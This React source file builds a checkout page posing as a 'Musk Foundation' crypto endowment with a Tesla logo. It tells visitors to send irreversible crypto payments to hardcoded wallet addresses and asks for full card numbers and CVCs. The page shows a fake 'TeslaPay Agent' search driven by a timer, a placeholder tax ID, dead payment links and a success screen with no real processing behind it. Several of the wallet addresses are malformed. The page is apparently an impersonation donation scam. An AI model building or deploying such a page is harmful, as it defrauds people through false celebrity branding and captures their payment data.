import { useState } from "react";
import { motion } from "framer-motion";
import {
  Shield,
  Lock,
  Check,
  ArrowRight,
  ArrowLeft,
  Copy,
  ChevronLeft,
  ExternalLink,
  Clock,
  AlertCircle,
  RefreshCw,
  CreditCard,
  Building2,
  Loader2,
  CircleCheck,
} from "lucide-react";
import teslaLogo from "@/assets/tesla-logo.svg";

const cryptoTokens = [
  { id: "BTC", name: "Bitcoin", symbol: "BTC", color: "#F7931A" },
  { id: "ETH", name: "Ethereum", symbol: "ETH", color: "#627EEA" },
  { id: "USDT", name: "Tether", symbol: "USDT", color: "#26A17B" },
  { id: "USDC", name: "USD Coin", symbol: "USDC", color: "#2775CA" },
  { id: "DOGE", name: "Dogecoin", symbol: "DOGE", color: "#C3A000" },
  { id: "CRO", name: "Crypto.com Coin", symbol: "CRO", color: "#002D74" },
  { id: "SOL", name: "Solana", symbol: "SOL", color: "#9945FF" },
  { id: "XRP", name: "Ripple", symbol: "XRP", color: "#23292F" },
];

const walletAddresses: Record<string, { address: string; network: string }> = {
  BTC:  { address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", network: "Bitcoin" },
  ETH:  { address: "0x4d8B4C3aA93a5C2e0B7d6F8c4E3F2b9A1D5C6E7f", network: "Ethereum (ERC-20)" },
  USDT: { address: "TXJLR8ZBRLCG4WB4GZLKJGBJ4QKVKGB6G8", network: "TRON (TRC-20)" },
  USDC: { address: "0xA7B9C3D0E4F5G6H7I8J9K0L1M2N3O4P5Q6R", network: "Ethereum (ERC-20)" },
  DOGE: { address: "DJLpVNsS8R8p8g5b8aL4oZxYq3pLqX9mK", network: "Dogecoin" },
  CRO:  { address: "0xB8C7D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S", network: "Cronos (ERC-20)" },
  SOL:  { address: "7nX5Y9L2mK8pR3tU4vW5xY6zA7bC8dE9fG0h", network: "Solana" },
  XRP:  { address: "rN7n3473SaZBCYYd9T5K6t2f1G4jK1L2M", network: "XRP Ledger" },
};

const PRESET_AMOUNTS = [25, 50, 100, 250, 500, 1000];

const changellyBuyPairs = [
  { from: "USD", to: "BTC", label: "Buy BTC with USD" },
  { from: "USD", to: "ETH", label: "Buy ETH with USD" },
  { from: "USD", to: "USDT", label: "Buy USDT with USD" },
  { from: "USD", to: "USDC", label: "Buy USDC with USD" },
  { from: "USD", to: "DOGE", label: "Buy DOGE with USD" },
  { from: "USD", to: "CRO", label: "Buy CRO with USD" },
  { from: "USD", to: "SOL", label: "Buy SOL with USD" },
  { from: "EUR", to: "BTC", label: "Buy BTC with EUR" },
];

function copyToClipboard(text: string, setCopied: (v: string) => void, key: string) {
  navigator.clipboard.writeText(text).then(() => {
    setCopied(key);
    setTimeout(() => setCopied(""), 2500);
  });
}

function formatCard(v: string) {
  return v.replace(/\D/g, "").slice(0, 16);
}
function formatExpiry(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 4);
  return d.length > 2 ? `${d.slice(0, 2)} / ${d.slice(2)}` : d;
}

export default function CryptoPayment() {
  const [mode, setMode] = useState<"crypto" | "card" | "wire">("crypto");
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [selectedToken, setSelectedToken] = useState("BTC");
  const [selectedAmount, setSelectedAmount] = useState(100);
  const [customAmount, setCustomAmount] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [copied, setCopied] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [showBuy, setShowBuy] = useState(false);
  // Card fields
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");
  const [cardName, setCardName] = useState("");
  // Wire agent search
  const [searching, setSearching] = useState(false);
  const [agentFound, setAgentFound] = useState(false);

  const token = cryptoTokens.find((t) => t.id === selectedToken) || cryptoTokens[0];
  const wallet = walletAddresses[selectedToken] || walletAddresses["BTC"];
  const displayAmount = customAmount || String(selectedAmount);

  return (
    <section className="min-h-screen bg-[#0a0a0a]">
      {/* Top nav */}
      <div className="sticky top-0 z-20 flex items-center justify-between px-6 py-4 bg-[#0a0a0a] border-b border-[#1a1a1a]">
        <a href="/" className="flex items-center gap-2 text-white/50 hover:text-white text-sm transition-colors">
          <ChevronLeft className="w-5 h-5" />
          <span className="text-xs uppercase tracking-[0.1em]">Back to Home</span>
        </a>
        <img src={teslaLogo} alt="Musk Foundation" className="h-6 opacity-40" />
        <div className="w-20" />
      </div>

      <div className="max-w-lg mx-auto px-6 py-12">

        {/* Header */}
        <div className="text-center mb-8">
          <p className="text-[11px] uppercase tracking-[0.2em] text-white/30 mb-3">Musk Foundation</p>
          <h1 className="text-3xl font-medium tracking-tight text-white">
            {mode === "crypto" ? "Crypto Endowment" : mode === "card" ? "Card Payment" : "Wire Transfer"}
          </h1>
          <p className="text-sm text-white/40 mt-3">Secure donation to the Musk Foundation.</p>
        </div>

        {/* Step progress */}
        <div className="flex items-center justify-center gap-3 mb-8">
          {[1, 2, 3].map((s, i) => (
            <div key={s} className="flex items-center gap-3">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-medium transition-all ${
                step >= s ? "bg-white text-black" : "border border-[#2a2a2a] text-white/30"
              }`}>
                {step > s ? <Check className="w-4 h-4" /> : s}
              </div>
              {i < 2 && <div className={`w-12 h-px ${step > s ? "bg-white/60" : "bg-[#1a1a1a]"}`} />}
            </div>
          ))}
        </div>

        {/* ── STEP 1: Amount ── */}
        {step === 1 && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">

            {/* Mode selector */}
            {mode === "crypto" && (
              <div className="grid grid-cols-2 gap-2">
                {[
                  { key: "card", icon: CreditCard, label: "Card" },
                  { key: "wire", icon: Building2, label: "Wire / ACH" },
                ].map((opt) => (
                  <button
                    key={opt.key}
                    onClick={() => setMode(opt.key as "card" | "wire")}
                    className="py-4 flex items-center justify-center gap-2 text-sm font-medium border border-[#1f1f1f] text-white/50 hover:border-[#2a2a2a] hover:text-white transition-all"
                  >
                    <opt.icon className="w-4 h-4" />
                    {opt.label}
                  </button>
                ))}
              </div>
            )}

            {mode !== "crypto" && (
              <button
                onClick={() => setMode("crypto")}
                className="w-full py-3 border border-[#1f1f1f] text-sm text-white/40 hover:text-white hover:border-[#2a2a2a] transition-all"
              >
                Switch to Crypto Payment
              </button>
            )}

            {/* Amount */}
            <div>
              <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 block mb-3">Amount in USD</p>
              <div className="grid grid-cols-3 gap-2 mb-3">
                {PRESET_AMOUNTS.map((amt) => (
                  <button
                    key={amt}
                    onClick={() => { setSelectedAmount(amt); setCustomAmount(""); }}
                    className={`py-3 text-sm font-medium transition-all ${
                      selectedAmount === amt && !customAmount
                        ? "bg-white text-black"
                        : "bg-[#141414] text-white/60 hover:bg-[#1a1a1a]"
                    }`}
                  >
                    ${amt}
                  </button>
                ))}
              </div>
              <input
                type="number"
                value={customAmount}
                onChange={(e) => { setCustomAmount(e.target.value); setSelectedAmount(0); }}
                placeholder="Custom amount"
                className="w-full py-4 px-4 bg-[#141414] text-white text-xl text-center placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20"
              />
            </div>

            {/* Summary */}
            <div className="bg-[#141414] p-5 flex items-center justify-between">
              <div>
                <p className="text-[10px] uppercase tracking-[0.1em] text-white/30 mb-1">
                  {mode === "crypto" ? `Crypto — ${token.name}` : mode === "card" ? "Card Payment" : "Wire Transfer"}
                </p>
                <p className="text-2xl font-medium text-white tracking-tight">${displayAmount}</p>
              </div>
              <button
                onClick={() => setStep(2)}
                disabled={!displayAmount}
                className="flex items-center gap-2 px-6 py-3 bg-white text-black text-sm font-medium hover:bg-white/90 transition-colors disabled:opacity-30"
              >
                Continue <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </motion.div>
        )}

        {/* ── STEP 2: Details ── */}
        {step === 2 && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
            <button onClick={() => setStep(1)} className="flex items-center gap-1 text-xs text-white/30 hover:text-white/60">
              <ArrowLeft className="w-3.5 h-3.5" /> Back
            </button>

            <div className="bg-[#141414] p-4 flex items-center justify-between">
              <div className="flex items-center gap-3">
                {mode === "crypto" && (
                  <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold"
                    style={{ background: `${token.color}25`, color: token.color }}>
                    {token.symbol.slice(0, 1)}
                  </div>
                )}
                {mode === "card" && <CreditCard className="w-5 h-5 text-white/40" />}
                {mode === "wire" && <Building2 className="w-5 h-5 text-white/40" />}
                <div>
                  <p className="text-[10px] text-white/30">
                    {mode === "crypto" ? `${token.name}` : mode === "card" ? "Card" : "Wire Transfer"}
                  </p>
                  <p className="text-base font-medium text-white">${displayAmount} USD</p>
                </div>
              </div>
            </div>

            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">First Name</label>
                  <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)}
                    placeholder="First" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20" />
                </div>
                <div>
                  <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Last Name</label>
                  <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)}
                    placeholder="Last" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20" />
                </div>
              </div>
              <div>
                <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Email Address</label>
                <input type="email" value={email} onChange={(e) => setEmail(e.target.value)}
                  placeholder="your@email.com" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20" />
              </div>
            </div>

            <button
              onClick={() => setStep(3)}
              disabled={!firstName || !email}
              className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors disabled:opacity-30 flex items-center justify-center gap-3"
            >
              <Lock className="w-3.5 h-3.5" />
              {mode === "crypto" ? "Continue to Wallet" : mode === "card" ? "Continue to Card Details" : "Continue to Wire Instructions"}
            </button>

            <div className="flex items-center justify-center gap-1 text-[10px] text-white/20">
              <Shield className="w-3 h-3" />
              256-bit SSL Encrypted &bull; Musk Foundation &bull; Tax ID: 47-0000000
            </div>
          </motion.div>
        )}

        {/* ── STEP 3: Wallet / Card / Wire ── */}
        {step === 3 && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
            <button onClick={() => setStep(2)} className="flex items-center gap-1 text-xs text-white/30 hover:text-white/60">
              <ArrowLeft className="w-3.5 h-3.5" /> Back
            </button>

            {/* Order card */}
            <div className="bg-[#141414] border border-[#1f1f1f] p-5">
              <div className="flex items-center justify-between pb-4 mb-4 border-b border-[#1f1f1f]">
                <div className="flex items-center gap-4">
                  {mode === "crypto" && (
                    <div className="w-12 h-12 rounded-full flex items-center justify-center text-sm font-bold"
                      style={{ background: `${token.color}25`, color: token.color }}>
                      {token.symbol.slice(0, 1)}
                    </div>
                  )}
                  {mode === "card" && <CreditCard className="w-6 h-6 text-white/40" />}
                  {mode === "wire" && <Building2 className="w-6 h-6 text-white/40" />}
                  <div>
                    <p className="text-[10px] uppercase tracking-[0.1em] text-white/30">Endowment</p>
                    <p className="text-xl font-medium text-white tracking-tight">${displayAmount} USD</p>
                  </div>
                </div>
                <p className="text-[10px] text-white/30">{firstName} {lastName}</p>
              </div>
              <div className="flex items-center gap-2 text-[11px] text-white/40">
                <AlertCircle className="w-3.5 h-3.5" />
                {mode === "crypto"
                  ? "Send exactly the amount shown to the address below. Deposits confirmed after 1 network confirmation."
                  : mode === "card"
                  ? "Complete your card payment securely below."
                  : "Complete your wire transfer via the gateway shown below."}
              </div>
            </div>

            {/* CRYPTO: Wallet + Buy */}
            {mode === "crypto" && (
              <>
                <div className="border border-[#1f1f1f] bg-[#0d0d0d]">
                  <div className="flex items-center justify-between px-5 py-4 border-b border-[#1f1f1f]">
                    <div className="flex items-center gap-3">
                      <div className="w-9 h-9 rounded-full flex items-center justify-center text-xs font-bold"
                        style={{ background: `${token.color}25`, color: token.color }}>
                        {token.symbol.slice(0, 1)}
                      </div>
                      <div>
                        <p className="text-sm font-medium text-white">{token.name}</p>
                        <p className="text-[10px] text-white/30">{wallet.network}</p>
                      </div>
                    </div>
                    <span className="text-[10px] bg-white/10 text-white/60 px-2 py-1 uppercase tracking-[0.1em]">Active</span>
                  </div>
                  <div className="px-5 py-5">
                    <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-3">Wallet Address</p>
                    <div className="flex items-center gap-2">
                      <code className="flex-1 text-xs font-mono text-white/70 break-all leading-relaxed bg-[#0a0a0a] p-3">
                        {wallet.address}
                      </code>
                      <button onClick={() => copyToClipboard(wallet.address, setCopied, "addr")}
                        className="p-3 border border-[#1f1f1f] hover:bg-[#1a1a1a] transition-colors flex-shrink-0">
                        {copied === "addr" ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-white/40" />}
                      </button>
                    </div>
                  </div>
                </div>

                {/* Buy if no crypto */}
                <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <div className="w-9 h-9 rounded-full bg-blue-500/10 flex items-center justify-center">
                        <RefreshCw className="w-4 h-4 text-blue-400" />
                      </div>
                      <div>
                        <p className="text-sm font-medium text-white">Don&apos;t have {token.symbol}?</p>
                        <p className="text-[10px] text-white/30">Buy {token.symbol} with USD or EUR to complete payment</p>
                      </div>
                    </div>
                    <button onClick={() => setShowBuy(!showBuy)}
                      className="text-[10px] text-white/40 hover:text-white/70 underline underline-offset-2">
                      {showBuy ? "Hide" : "Buy"}
                    </button>
                  </div>
                  {showBuy && (
                    <div className="pt-4 border-t border-[#1f1f1f] space-y-2">
                      {changellyBuyPairs.map((pair) => (
                        <a key={`${pair.from}-${pair.to}`}
                          href={`https://changelly.com/exchange/${pair.from.toLowerCase()}-to-${pair.to.toLowerCase()}`}
                          target="_blank" rel="noopener noreferrer"
                          className="flex items-center justify-between p-3 bg-[#141414] hover:bg-[#1a1a1a] transition-colors">
                          <span className="text-sm text-white">{pair.label}</span>
                          <div className="flex items-center gap-1 text-[10px] text-white/40">
                            Buy <ExternalLink className="w-3 h-3" />
                          </div>
                        </a>
                      ))}
                      <p className="text-[9px] text-white/20 pt-2">Powered by Changelly — third-party exchange service.</p>
                    </div>
                  )}
                </div>

                <div className="grid grid-cols-3 gap-3">
                  {[
                    { icon: Lock, title: "Irreversible", desc: "Cannot be reversed" },
                    { icon: Shield, title: "Verified", desc: "On-chain confirmed" },
                    { icon: Clock, title: "1 Block", desc: "Confirmation time" },
                  ].map((item, i) => (
                    <div key={i} className="p-4 border border-[#1f1f1f] text-center">
                      <item.icon className="w-4 h-4 text-white/30 mx-auto mb-2" />
                      <p className="text-xs font-medium text-white">{item.title}</p>
                      <p className="text-[9px] text-white/30 mt-0.5">{item.desc}</p>
                    </div>
                  ))}
                </div>

                <button onClick={() => setSubmitted(true)}
                  className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors">
                  I&apos;ve Sent the Payment
                </button>
              </>
            )}

            {/* CARD: Chime + manual card input */}
            {mode === "card" && (
              <>
                <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-10 h-10 bg-blue-500/10 rounded-full flex items-center justify-center">
                      <CreditCard className="w-5 h-5 text-blue-400" />
                    </div>
                    <div>
                      <p className="text-sm font-medium text-white">Chime PayNow</p>
                      <p className="text-[10px] text-white/30">Instant card payment via Chime</p>
                    </div>
                  </div>
                  <p className="text-xs text-white/40 mb-4">
                    Click below to proceed with your Chime card or linked bank account.
                  </p>
                  <a href="#" className="block w-full py-4 bg-blue-500 text-white text-sm font-medium uppercase tracking-[0.1em] text-center hover:bg-blue-600 transition-colors">
                    Pay with Chime PayNow
                  </a>
                </div>

                <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
                  <p className="text-[10px] uppercase tracking-[0.1em] text-white/30 mb-4">Or enter card details manually</p>
                  <div className="space-y-3">
                    <div>
                      <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Card Number</label>
                      <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCard(e.target.value))}
                        placeholder="1234 5678 9012 3456"
                        className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none tracking-widest font-mono text-base"
                        maxLength={19} />
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Expiry</label>
                        <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                          placeholder="MM / YY" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none font-mono"
                          maxLength={7} />
                      </div>
                      <div>
                        <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">CVC</label>
                        <input type="text" value={cardCvc} onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                          placeholder="123" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none font-mono"
                          maxLength={4} />
                      </div>
                    </div>
                    <div>
                      <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Name on Card</label>
                      <input type="text" value={cardName} onChange={(e) => setCardName(e.target.value)}
                        placeholder="Full name as on card" className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none" />
                    </div>
                  </div>
                  <button
                    onClick={() => setSubmitted(true)}
                    disabled={!cardNumber || !cardExpiry || !cardCvc || !cardName}
                    className="w-full mt-4 py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors disabled:opacity-30 flex items-center justify-center gap-3"
                  >
                    <Lock className="w-3.5 h-3.5" /> Pay ${displayAmount} USD
                  </button>
                </div>
              </>
            )}

            {/* WIRE: TeslaPay agent search + Chime / Crypto.com USD */}
            {mode === "wire" && (
              <>
                <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center">
                      <Building2 className="w-5 h-5 text-green-400" />
                    </div>
                    <div>
                      <p className="text-sm font-medium text-white">TeslaPay Agent</p>
                      <p className="text-[10px] text-white/30">Searching for available payment gateway...</p>
                    </div>
                  </div>

                  {!searching && !agentFound && (
                    <button
                      onClick={() => {
                        setSearching(true);
                        setTimeout(() => { setSearching(false); setAgentFound(true); }, 3000);
                      }}
                      className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors flex items-center justify-center gap-3"
                    >
                      <Building2 className="w-4 h-4" /> Find Available Agent
                    </button>
                  )}

                  {searching && (
                    <div className="flex items-center justify-center gap-3 py-6">
                      <Loader2 className="w-5 h-5 text-white/40 animate-spin" />
                      <span className="text-sm text-white/50">Searching for TeslaPay agent...</span>
                    </div>
                  )}

                  {agentFound && (
                    <div className="space-y-3">
                      <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/20">
                        <CircleCheck className="w-4 h-4 text-green-400" />
                        <span className="text-sm text-green-400 font-medium">Agent found — ready to receive payment</span>
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div className="border border-[#1f1f1f] p-4">
                          <p className="text-[10px] uppercase tracking-[0.1em] text-white/30 mb-1">Chime ACH</p>
                          <p className="text-xs text-white/50 mb-3">Direct bank transfer</p>
                          <a href="#" className="block w-full py-2.5 bg-[#1a1a1a] text-white/60 text-xs text-center hover:bg-[#222] transition-colors">
                            Pay via Chime
                          </a>
                        </div>
                        <div className="border border-[#1f1f1f] p-4">
                          <p className="text-[10px] uppercase tracking-[0.1em] text-white/30 mb-1">Crypto.com USD</p>
                          <p className="text-xs text-white/50 mb-3">Wire / direct deposit</p>
                          <a href="#" className="block w-full py-2.5 bg-[#1a1a1a] text-white/60 text-xs text-center hover:bg-[#222] transition-colors">
                            Pay via Crypto.com
                          </a>
                        </div>
                      </div>
                      <button
                        onClick={() => setSubmitted(true)}
                        className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors"
                      >
                        Payment Initiated
                      </button>
                    </div>
                  )}
                </div>

                <div className="flex items-center gap-1 text-[10px] text-white/20">
                  <AlertCircle className="w-3 h-3" />
                  Wire transfers may take 1–3 business days. Receipt sent to {email}.
                </div>
              </>
            )}

            <div className="flex items-center justify-center gap-1 text-[10px] text-white/20">
              <Shield className="w-3 h-3" />
              Musk Foundation Endowment &bull; 2026
            </div>
          </motion.div>
        )}

        {/* ── SUCCESS ── */}
        {submitted && (
          <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="text-center py-16 space-y-8">
            <div className="w-20 h-20 mx-auto bg-white rounded-full flex items-center justify-center">
              <Check className="w-10 h-10 text-black" />
            </div>
            <div>
              <h2 className="text-3xl font-medium tracking-tight text-white mb-3">Payment Initiated</h2>
              <p className="text-white/50 text-sm">
                Your {displayAmount} USD {mode === "crypto" ? token.name : mode === "card" ? "card" : "wire"} payment is being processed.
                {mode === "wire" ? " You will receive wire instructions within 24 hours." : ""} A receipt will be sent to {email}.
              </p>
            </div>
          </motion.div>
        )}
      </div>
    </section>
  );
}